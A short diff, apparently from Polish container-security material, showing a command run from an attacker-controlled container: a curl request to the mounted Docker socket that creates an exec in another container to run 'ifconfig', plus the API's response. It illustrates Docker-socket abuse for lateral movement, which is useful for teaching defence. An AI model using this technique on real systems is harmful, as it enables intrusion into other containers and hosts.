@@ -1,0 +1,5 @@
+# Polecenie wykonane w kontenerze przejętym przez atakującego
+$ curl -H "Content-Type: application/json" -d '{"AttachStdout": true,"Cmd":
+["ifconfig"]}' --unix-socket /var/run/docker.sock 'http://localhost/containe
+rs/92a5b1b13c9b70c8982cf76777f0701cda5c11dd506699d19e3b14607218342a/exec'
+{"Id":"8ecb65b7c41db457972b43938f1231a2e5782add7a6b7d8ee6988c9156b8ebf0"}
